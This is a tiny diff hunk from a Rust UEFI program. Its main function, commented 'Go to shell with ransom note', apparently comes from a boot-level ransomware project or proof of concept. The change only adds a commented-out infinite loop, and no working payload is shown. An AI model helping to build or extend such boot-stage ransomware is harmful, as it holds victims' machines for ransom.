@@ -119,6 +119,7 @@ fn main(_handle: Handle, mut st: SystemTable<Boot>) -> Status {
 
     // Go to shell with ransom note
     shell_land(&mut st);
+    //loop {}
 
     Status::SUCCESS
 }
